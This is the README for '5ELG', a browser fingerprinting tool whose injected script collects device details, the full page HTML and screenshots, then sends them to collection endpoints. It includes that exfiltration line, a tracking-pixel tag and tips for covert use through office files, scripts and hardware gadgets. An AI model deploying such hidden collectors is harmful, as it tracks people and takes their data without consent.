# 5ELG - bro5er dEaL finGerprinter

![](https://i.imgur.com/MI80tsY.png)

Browser fingerprinting is a technique used to create a unique identifier for a user's browser based on various attributes and configurations. This "browser deal fingerprinted" is a personal project focused on browser tracking. It collects and stores detailed information about browser requests and user environments, providing insights into browser characteristics and behaviors.
## Table of Contents

- [Overview](#overview)
- [Installation](#installation)
- [Usage](#usage)
	- [5ELG Web](#bashboard)
	- [Configuration](#configuration)
- [5ELG API Documentation](#5ELG-API)
- [Fingerprinting](#ABOUT-FINGERPRINTING)
- [Limitations](#Limitations)
- [Links](#LINKS)
## Overview

5ELG leverages data collection and retrieval. It gathers a comprehensive set of attributes and configurations from the user’s browser environment, creating a unique fingerprint. This fingerprint, along with other metadata, is stored in an SQLite database, where it can be accessed in a web dasboard.

The unique aspect of 5ELG is that both the JavaScript responsible for tracking, called "*merca*" and the data sender to the dashboard, known as the "dealer," are independent modules. This modular design allows for various tracking methods beyond simply embedding a link. These components can be embedded into office files or triggered from other functionalities, enabling "merca" to send data to the dealer, which then forwards it to 5ELG. Alternatively, if connectivity is unavailable, data can be written to a CSV file, which can later be uploaded to the panel for processing.

![](https://i.imgur.com/7qvRoSm.png)
## Installation

1. **Clone the repository**:
    ```bash
    git clone https://github.com/yourusername/5elg.git
    cd 5elg
    ```

2. **Install dependencies**:
    *Make sure you have Go and SQLite installed:*
    ```bash
    go get -u gorm.io/gorm
    go get -u gorm.io/driver/sqlite
    ```

3. **Run the server**:
    ```bash
    # Default lunch is running on localhost:8888
    go run main.go 
    # Paramed lunch
    go run main.go -host <ip> -port <port> 
	# -ssl param is optional if https wanted. Certificates must be stored in Sources/ proyect folder. 
	# Paramed autentication
	go run main.go -host <ip> -port <port> -user myuser -password mypass

	```

## **Usage**

### **5ELG DASHBOARD**

5ELG provides a web panel that allows you to track requests received by the "dealers" and upload a CSV file for data collection. Through this interface, you can identify active dealers and view detailed specifications of the browser request data. The panel requires authentication, and it is strongly recommended to change the default basic authentication credentials, as mentioned in the configuration section.

![](https://i.imgur.com/gcek4VL.png)

**Usage tip:** *You can run 5ELG locally (localhost) to keep the panel hidden from public access. Additionally, you can configure the backend of a dealer on the same server to interact with it discreetly through a local address, ensuring a more "stealthy" interaction.*
##### 5ELG provides several endpoints for interacting with the data:
		
	- Endpoint: /
		- Description: This is the root endpoint of the API. It likely serves the main page or an index view.
	
	- Endpoint: /dashboard-logs
		- Description: Displays logs for the dashboard. This endpoint is likely used to provide access to traffic or request logs in a dashboard interface.
	
In the **info** section, at the top, you'll find a hash that uniquely identifies each request. This hash serves as an individual identifier for tracking purposes. Below the hash, you'll see all the information gathered by the dealer, both from the client side and server side. Additionally, if the dealer was able to capture screenshots, generate a PDF, or collect other graphical information, this data will also be displayed in this section. This comprehensive view allows for detailed analysis of each request and its associated data.
	
	- Endpoint: /info
		- Description: Provides detailed information about a specific request or data set. This could be used to display or analyze request logs or metadata.
	
	- Endpoint: /scope
		- Description: CSV data upload.
	
	- Endpoint: /data-dealers
		- Description: Information about working dealers.

	- Endpoint: /data-logs
		- Description: Retrieves data or metrics related to the scope of the application, possibly including system status or database information.
	

![](https://i.imgur.com/pqJ0g9p.png)

The **Live Traffic Callback Server** in 5ELG is a service designed to monitor and display real-time traffic data in a web-based interface. It acts as a callback endpoint for external services or applications to send real-time notifications, logs, or data updates to the server.

	- Endpoint: /callback-server
		- Description: Handles the server-side processing of callback events. This is used for managing asynchronous responses or notifications from external services.

The server captures these asynchronous responses, processes them, and displays live traffic information on the dashboard. This is useful for monitoring active requests, user behavior, or events in real-time. It allows administrators or developers to see a dynamic flow of incoming data, making it especially valuable for debugging, traffic analysis, or monitoring specific metrics as they occur.

![](https://i.imgur.com/uV90IM6.png)

In addition, the callback server can be configured to work with other tools or services, enabling seamless integration for live monitoring of API requests, security events, or general server traffic.

The **/merca** web-endpoint captures and encodes server and request data, while the **/dealer** or **/reciver** endpoint processes and stores this information.

	- Endpoint: /reciver
		- Description: This endpoint is responsible for receiving data from external sources. It likely processes and stores incoming data or requests.
	
	- Endpoint: /dealer
		- Description: This endpoint can also serve as an entry point for the callback server, handling dealer-related operations such as processing specific actions or receiving asynchronous data from external services. It enables real-time tracking and efficient integration with third-party systems.
	
	- Endpoint:/merca
		- Description: Responsible for handling requests or data related to "merca." This may involve client-side data or another specific functionality within the application.

In the project's dealers folder, you will find several dealer examples that can be used as artifacts for connectivity testing. Keep in mind that these dealers are pre-configured to internally send data to the dealer component of the 5ELG panel. These examples provide a useful starting point for understanding how the system works and can be adapted for different testing scenarios.
## **CONFIGURATION**

### **MANUAL DEALER CONFIGURATION**

_Many of these dealers are still in the development phase and may not function perfectly. We are more than happy to receive your issues or ideas for new dealers, as well as suggestions for improvements or changes to existing ones. Your feedback is invaluable in helping us refine and expand the project to better meet the needs of the community._

The "merca", which refers to the JavaScript we inject to interact with the dealers, contains a variable called **dealer_uri**. This variable should be set to the URL of the DEALER. By doing so, regardless of whether the dealers are hosted on the same site or not, they can communicate seamlessly. This approach enhances the flexibility and reach of the project, allowing for more diversified actions.

**JAVASCRIPT CONFIGURATION**
```html
<script>
      //DEALER_CLIENT_SIDE_CONFIG
      let dealer_uri = "https://5elg.dealer.site/dealer_name.php";
</script>
```

The dealer's backend can be hosted on a separate server and requires certain variables to be configured. These variables have the same names across all examples, regardless of the programming language being used. 

**PHP EXAMPLE**
```php
<?php
    $DEALER_NAME="PHP.DEALER"; //DEALER_NAME_IN_DASHBOARD
    $MODE="SENDER"; //SAVER or SENDER //DEALER_MODE    
    $URI_REZ="http://5elg.site:PORT/reciver"; //5ELG RECIVER URL IF SENDER	
    $PATH_WRITER="/tmp/out.csv";  //5ELG CSV URL IF SAVER
?>
```

**JSP EXAMPLE**
```jsp
<%
	String DEALER_NAME = "JSP.DEALER"; 
	String MODE = "SENDER"; 
	String PATH_WRITER = "/tmp/out.csv";
	String URI_REZ = "http://5elg.site:PORT/reciver";
%>
```

**ASP EXAMPLE**
```asp
<%
    DEALER_NAME = "ASP.DEALER"
    MODE = "SENDER"
    PATH_WRITER = "C:\temp\out.csv"
    URI_REZ = "http://5elg.site:PORT/reciver"
%>
```

**OFIMATIC DEALER**

Additionally, we are considering the possibility of creating office-based DEALERS, such as DOCX, XLSX, and PDF files. These files would incorporate scripts or embedded resources that can trigger the browser in the background to capture and send requests. This opens up a wide range of possibilities for collecting data in more discreet and creative ways. By embedding tracking mechanisms directly into common office documents, we can execute actions like fingerprinting without relying solely on traditional web-based environments. These office-based DEALERS provide an innovative approach to expanding the scope of data collection and interaction, making the system more versatile and adaptable to different contexts.

**POWERSHELL DEALER**

This same approach can be integrated into Bash scripts, PowerShell, and many other operating system functions that support JavaScript execution. By leveraging the flexibility of these scripting environments, we can execute fingerprinting and data collection processes seamlessly across various platforms.

**HARDWARE DEALER**

Finally, it’s possible to configure devices, such as Arduinos or Flipper Zeros, to force these requests as well. These devices can be programmed to interact with the dealers, triggering the collection of data from target systems in a more covert manner. This expands the versatility of the project, allowing for innovative ways to generate and track requests beyond typical browser or server-based environments.

___
## 5ELG API

This server provides several API endpoints for handling logs and retrieving data related to your application, allowing you to manage logs, generate backups, and query specific data in various formats. Each endpoint serves a specific purpose, whether for retrieving, deleting, or counting log entries, and it requires Basic Authentication for secure access. The server ensures that only authorized users can access or modify the data. With these API endpoints, you can easily manage and retrieve data from your application logs in various formats like CSV and JSON, facilitating data analysis and log tracking.

1. **`/api/generate_csv_logs`**:
   - **Method**: `POST`
   - **Description**: Generates a backup of the logs in CSV format and stores the backup file locally on the server.

2. **`/api/clear_logs`**:
   - **Method**: `POST`
   - **Description**: Clears all log entries from the database. Useful for resetting or cleaning the database state.

3. **`/api/count_dealers`**:
   - **Method**: `GET`
   - **Description**: Returns the number of requests processed by each registered dealer. Provides statistics on the number of interactions with each dealer.

4. **`/api/csv_client_info`**:
   - **Method**: `GET`
   - **Parameters**: `id=<client_id>`
   - **Description**: Downloads a CSV file containing the information for a specific client, based on the provided `client_id`.

5. **`/api/csv_all_clients`**:
   - **Method**: `GET`
   - **Description**: Downloads a CSV file containing information for all registered clients.

6. **`/api/get_clientF_info`**:
   - **Method**: `GET`
   - **Parameters**: `fu=<fingerprint_user>`
   - **Description**: Returns JSON data related to a specific user fingerprint (`Fu`), which is a unique identifier generated by the system.

7. **`/api/last7logs`**:
   - **Method**: `GET`
   - **Description**: Provides a summary of the last 7 days of logs stored in the system. Displays recent activity.

8. **`/api/logs/total`**:
   - **Method**: `GET`
   - **Description**: Returns the total number of logs stored in the database, providing an overview of the number of entries.

9. **`/api/logs/dealers`**:
   - **Method**: `GET`
   - **Description**: Returns logs grouped by each dealer, providing a detailed analysis of each dealer's activity.

10. **`/api/logs/ip`**:
    - **Method**: `GET`
    - **Description**: Returns logs grouped by IP address, providing information on how many requests have been received from each IP.

11. **`/api/logs/fpus`**:
    - **Method**: `GET`
    - **Description**: Returns logs grouped by browser fingerprints (`Fb`) generated by the system based on the client's browser footprint.

12. **`/api/logs/fus`**:
    - **Method**: `GET`
    - **Description**: Returns logs grouped by user fingerprints (`Fu`), providing a detailed analysis of unique users.

## ABOUT FINGERPRINTING 

The "delaer" collect extensive browser, system, and user information to generate a unique browser fingerprint. It also sends this information back to the server for further analysis. 

The script gathers various types of information from the browser and system, including:

- **Browser plugins**
- **Device properties** such as hardwareConcurrency, platform, vendor, etc.
- **GPU Model** through WebGL, which extracts details about the graphics hardware.
- **Battery status** through the `getBattery()` API.
- **Permissions status** (e.g., geolocation, camera, notifications) using the `navigator.permissions.query()` method.
- **Media devices** such as cameras and microphones.
- **Browser extensions** by analyzing MIME types and plugins
- **Page HTML**: The entire DOM (`document.documentElement.outerHTML`) is captured and encoded in Base64.
- **Screenshot**: Using the `html2canvas` library, a screenshot of the current page is taken and converted to a Base64-encoded image.

All of this data is serialized and encoded using SHA256 hashing to generate a browser fingerprint. This uniquely identifies the browser and device. Once all data is collected, including the browser fingerprint, page HTML, screenshot, and browser extensions, an `XMLHttpRequest` sends this data to the server in the form of a POST request.

The server receives:

- **`u`**: The user's fingerprint (generated through SHA256).
- **`b`**: The browser fingerprint.
- **`r`**: A hash representing the combination of gathered data.
- **`code`**: The Base64-encoded page HTML.
- **`s`**: The Base64-encoded screenshot.
- **`data`**: The fingerprint data, serialized as JSON and Base64-encoded.

```javascript
xhr.send("u=" + uf + "&b=" + bf + "&r=" + rh + "&code=" + encodeURIComponent(encodedPageHTML) + "&s=" + encodeURIComponent(encodedImg) + "&data=" + dts);
```
#### NoScript and CSS-Based Tracking

The script also includes a `<noscript>` block to track users who have JavaScript disabled. Within this block:

- **Font-based tracking**: Font faces are defined with URLs that send requests to the server. Depending on the system font, the URL will identify the operating system (e.g., "Ubuntu", "Windows", or "Linux").
- **CSS property support detection**: The script uses `@supports` rules to detect which CSS properties are supported, allowing the identification of different browsers (e.g., Chrome, Firefox, WebKit-based browsers).
- **One pixel image tracking:** If JavaScript or certain CSS properties are disabled, the server will still receive tracking requests via image requests embedded in the `<noscript>` tag and within the CSS `@supports` rules. These requests inform the server that JavaScript is disabled or that the user is blocking certain CSS properties

```html
<img class="js-disabled-message" src="http://5RLG-URI/dealer.png?unjs=true&u=img-ping&b=CSS_BLOCKING-DETECTED">
```

---
## **Limitations**

#### **Difficulties in Browser Fingerprinting**

Browser fingerprinting using JavaScript, while powerful, is not without its limitations. These constraints arise from browser security policies, updates, and the broader web ecosystem designed to protect user privacy and security. Below is an explanation of key limitations that can affect the effectiveness of browser fingerprinting.

##### 1. **"Mixed Content" Error**
Browsers are increasingly strict about preventing insecure (HTTP) content from being loaded on secure (HTTPS) pages. If fingerprinting scripts are hosted on an HTTP server and embedded in an HTTPS page, the browser may block these scripts from running. This is called a "Mixed Content" error, and it limits the ability to gather fingerprints reliably across all websites.
##### 2. **"NET::ERR_CERT_AUTHORITY_INVALID" Error**
This error occurs when a website or resource, such as the dealer or the fingerprinting server, uses an invalid SSL/TLS certificate. If the browser does not trust the certificate authority, it will block the connection, preventing the fingerprinting script from executing. For browser fingerprinting to be effective, the dealer server must use a valid and trusted SSL certificate to avoid these errors.
##### 3. **Cross-Origin Resource Sharing (CORS)**
CORS policies are designed to prevent unauthorized access to resources on a different domain. When a fingerprinting script tries to send data to a dealer hosted on a separate domain, the browser enforces CORS restrictions to ensure the request is allowed by the server. If the dealer server does not include appropriate CORS headers, the browser will block the request, making it impossible to collect and send data across domains.
##### 4. **Content-Security-Policy (CSP)**
Content-Security-Policy (CSP) is a security feature that allows website owners to control which resources the browser is allowed to load. Websites can restrict scripts, styles, and content to specific domains. A strict CSP policy can block fingerprinting scripts, even if they are loaded from trusted servers. This limits the deployment of fingerprinting techniques, especially when interacting with websites that enforce strong security policies.
##### 5. **Browser Security Policies**
Browsers have built-in security policies to prevent potentially harmful activities, such as accessing certain browser properties or running specific JavaScript features. These restrictions can reduce the amount of information available for fingerprinting. For instance, modern browsers are designed to limit access to certain APIs, or they may randomize or obfuscate values like screen resolution or time zones to mitigate fingerprinting.
##### 6. **Browser Automatic and Silent Updates**
Browsers frequently release automatic updates that can change internal configurations, APIs, or introduce new security features. These updates can break fingerprinting mechanisms by modifying the behavior of JavaScript APIs or adding new anti-fingerprinting features. Since these updates are often silent, fingerprinting scripts that worked before may suddenly stop functioning correctly or return inconsistent data.
##### 7. **Web Application Firewalls (WAFs)**
Web Application Firewalls (WAFs) are increasingly used to block unwanted traffic and potentially harmful scripts. They can identify and block fingerprinting attempts by detecting unusual requests or patterns typical of fingerprinting tools. WAFs may prevent the dealer from collecting data or block the transmission of fingerprints to the server, limiting the effectiveness of fingerprinting techniques.

## LINKS

- https://loveisinthe.net/blog/2023/05/10/How-to-track-privacy-lovers-browser/
- https://loveisinthe.net/blog/2023/01/07/MORE-IN-JS-FINGERPRINT-WORLD/
- https://loveisinthe.net/blog/2021/10/25/Cl13nt-SId3-H4cKing-Introduction/
- https://fingerprint.com/blog/browser-fingerprinting-techniques/#:~:text=Browser%20fingerprinting%20is%20a%20set,%2C%20keyboard%20layout%2C%20and%20more.
- https://amiunique.org/
- https://exosunand.net/
   
---

![](https://imgflip.com/i/9ggze6)
